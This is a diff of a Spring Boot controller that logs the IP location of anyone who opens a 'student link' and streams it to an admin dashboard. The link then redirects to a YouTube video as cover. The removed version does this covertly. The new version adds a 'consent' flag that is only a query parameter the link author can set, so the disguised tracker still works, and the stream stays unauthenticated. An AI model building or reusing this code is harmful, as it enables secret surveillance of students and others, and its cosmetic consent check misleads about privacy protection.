@@ -1,22 +1,31 @@
 package com.secure.hms.controller;
 
+import java.net.URI;
 import java.util.HashMap;
 import java.util.Map;
 
+import com.secure.hms.service.LocationService;
+
+import jakarta.servlet.http.HttpServletRequest;
+
+import org.springframework.http.HttpHeaders;
 import org.springframework.http.HttpStatus;
 import org.springframework.http.MediaType;
 import org.springframework.http.ResponseEntity;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestBody;
+import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
 import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;
 
-import com.secure.hms.service.LocationService;
-
-import jakarta.servlet.http.HttpServletRequest; // Spring Boot 2 -> javax.servlet.http.HttpServletRequest
-
 @RestController
 public class LocationController {
+
+    private static final String YOUTUBE_URL =
+            "https://www.youtube.com/watch?v=Ae66MhGBDTA"
+            + "&list=RDAe66MhGBDTA&start_radio=1";
 
     private final LocationService locationService;
 
@@ -24,103 +33,107 @@ public class LocationController {
         this.locationService = locationService;
     }
 
-    // ---- Student link ---- opening it captures network/IP location, returns a blank page ----
-    // no-store/no-cache headers force iOS Safari to hit the server on every open instead of
-    // serving a cached/prefetched response (which caused "no row" on iPhone).
-    // Open over https:// only.  Optional id: /location?userId=STUDENT123
+    /*
+     * IP-based location, then redirect.
+     * Use only after informing the user and obtaining consent.
+     */
     @GetMapping("/location")
-    public ResponseEntity<String> captureLocation(@RequestParam(required = false) String userId,
-                                                  HttpServletRequest httpRequest) {
-        String clientIp = getClientIp(httpRequest);
+    public ResponseEntity<?> captureLocation(
+            @RequestParam(required = false) String userId,
+            @RequestParam(defaultValue = "false") boolean consent,
+            HttpServletRequest request) {
 
-        Map<String, Object> body = new HashMap<>();
-        if (userId != null) {
-            body.put("userId", userId);
-        }
-        // No GPS coords -> service uses network/IP location only, then broadcasts to the admin.
-        locationService.processLocation(body, clientIp);
-
-        return ResponseEntity
-                .status(HttpStatus.FOUND)
-                .header("Location",
-                        "https://www.youtube.com/watch?v=Ae66MhGBDTA&list=RDAe66MhGBDTA&start_radio=1")
-                .build(); // blank page
+        return captureIpLocation(userId, consent, request);
     }
 
-    // ---- Admin dashboard subscribes here for the live feed ----
-    @GetMapping("/api/location/stream")
-    public SseEmitter stream() {
+    /*
+     * No HTML page: this endpoint also uses IP-based location only.
+     * It cannot obtain GPS coordinates by itself.
+     */
+    @GetMapping("/location/gps")
+    public ResponseEntity<?> captureGpsLocation(
+            @RequestParam(required = false) String userId,
+            @RequestParam(defaultValue = "false") boolean consent,
+            HttpServletRequest request) {
+
+        return captureIpLocation(userId, consent, request);
+    }
+
+    private ResponseEntity<?> captureIpLocation(
+            String userId,
+            boolean consent,
+            HttpServletRequest request) {
+
+        if (!consent) {
+            return ResponseEntity.status(HttpStatus.FORBIDDEN)
+                    .contentType(MediaType.TEXT_PLAIN)
+                    .body("Location reporting requires informed consent.");
+        }
+
+        Map<String, Object> body = new HashMap<>();
+        body.put("userId", userId);
+        body.put("gpsAvailable", false);
+
+        locationService.processLocation(body, getClientIp(request));
+
+        return ResponseEntity.status(HttpStatus.FOUND)
+                .location(URI.create(YOUTUBE_URL))
+                .build();
+    }
+
+    /*
+     * Receives coordinates from a browser that has obtained
+     * the user's GPS permission.
+     */
+    @PostMapping(
+            value = "/api/location/report",
+            consumes = MediaType.APPLICATION_JSON_VALUE,
+            produces = MediaType.APPLICATION_JSON_VALUE
+    )
+    public ResponseEntity<?> reportLocation(
+            @RequestBody Map<String, Object> body,
+            HttpServletRequest request) {
+
+        if (!Boolean.TRUE.equals(body.get("consent"))) {
+            return ResponseEntity.status(HttpStatus.FORBIDDEN)
+                    .body(Map.of(
+                            "error",
+                            "Location reporting requires informed consent."
+                    ));
+        }
+
+        String result = locationService.processLocation(
+                body,
+                getClientIp(request)
+        );
+
+        return ResponseEntity.ok()
+                .contentType(MediaType.APPLICATION_JSON)
+                .body(result);
+    }
+
+    /*
+     * Live location-report stream for the admin dashboard.
+     */
+    @GetMapping(
+            value = "/api/location/stream",
+            produces = MediaType.TEXT_EVENT_STREAM_VALUE
+    )
+    public SseEmitter streamLocations() {
         return locationService.subscribe();
     }
 
-    // ---- Admin page ----  https://your-app.onrender.com/location/admin
-    @GetMapping(value = "/location/admin", produces = MediaType.TEXT_HTML_VALUE)
-    public String adminPage() {
-        return ADMIN_PAGE;
-    }
-
-    // Reads the real client IP even behind Render's / any reverse proxy.
+    /*
+     * Use the forwarded client IP header only when your deployment
+     * proxy is configured to set/overwrite it safely.
+     */
     private String getClientIp(HttpServletRequest request) {
-        String forwarded = request.getHeader("X-Forwarded-For");
-        if (forwarded != null && !forwarded.isBlank()) {
-            return forwarded.split(",")[0].trim();   // first IP = original client
+        String forwardedFor = request.getHeader("X-Forwarded-For");
+
+        if (forwardedFor != null && !forwardedFor.isBlank()) {
+            return forwardedFor.split(",")[0].trim();
         }
+
         return request.getRemoteAddr();
     }
-
-    private static final String ADMIN_PAGE = """
-        <!DOCTYPE html>
-        <html lang="en">
-        <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <title>HMS - Admin Live Location</title>
-        <style>
-          body{font-family:system-ui,Arial,sans-serif;max-width:900px;margin:30px auto;padding:0 16px;}
-          #status{font-size:13px;margin-bottom:16px;}
-          .on{color:#16a34a;} .off{color:#dc2626;}
-          table{width:100%;border-collapse:collapse;font-size:14px;}
-          th,td{text-align:left;padding:8px 10px;border-bottom:1px solid #e5e7eb;}
-          th{background:#f9fafb;}
-          .badge{padding:2px 8px;border-radius:999px;font-size:12px;font-weight:600;}
-          .gps{background:#dcfce7;color:#166534;} .ip{background:#fef3c7;color:#92400e;}
-          tr.fresh{animation:flash 1.2s ease-out;}
-          @keyframes flash{from{background:#dbeafe;}to{background:transparent;}}
-          a{color:#2563eb;}
-        </style>
-        </head>
-        <body>
-        <h1>Live Student Locations</h1>
-        <div id="status" class="off">Connecting...</div>
-        <table>
-        <thead><tr><th>Time</th><th>Student</th><th>Source</th><th>Coordinates</th><th>Area</th><th>Map</th></tr></thead>
-        <tbody id="rows"><tr id="empty"><td colspan="6" style="color:#6b7280">No requests yet...</td></tr></tbody>
-        </table>
-        <script>
-          const statusEl=document.getElementById('status');
-          const rows=document.getElementById('rows');
-          const es=new EventSource('/api/location/stream');
-          es.addEventListener('connected',()=>{ statusEl.textContent='Live - connected'; statusEl.className='on'; });
-          es.addEventListener('location',e=>addRow(JSON.parse(e.data)));
-          es.onerror=()=>{ statusEl.textContent='Disconnected - retrying...'; statusEl.className='off'; };
-          function addRow(d){
-            const empty=document.getElementById('empty'); if(empty) empty.remove();
-            const gps=d.gpsAvailable;
-            const lat=gps?d.gpsLatitude:d.ipLatitude;
-            const lng=gps?d.gpsLongitude:d.ipLongitude;
-            const area=gps?('~'+d.gpsAccuracy+' m'):[d.ipCity,d.ipRegion,d.ipCountry].filter(Boolean).join(', ');
-            const tr=document.createElement('tr'); tr.className='fresh';
-            tr.innerHTML='<td>'+new Date().toLocaleTimeString()+'</td>'
-              +'<td>'+(d.userId||'-')+'</td>'
-              +'<td><span class="badge '+(gps?'gps':'ip')+'">'+(gps?'GPS':'IP')+'</span></td>'
-              +'<td>'+fmt(lat)+', '+fmt(lng)+'</td>'
-              +'<td>'+(area||'-')+'</td>'
-              +'<td>'+(d.mapsLink?'<a href="'+d.mapsLink+'" target="_blank">open</a>':'-')+'</td>';
-            rows.prepend(tr);
-          }
-          function fmt(v){ return (v==null)?'-':Number(v).toFixed(5); }
-        </script>
-        </body>
-        </html>
-        """;
 }
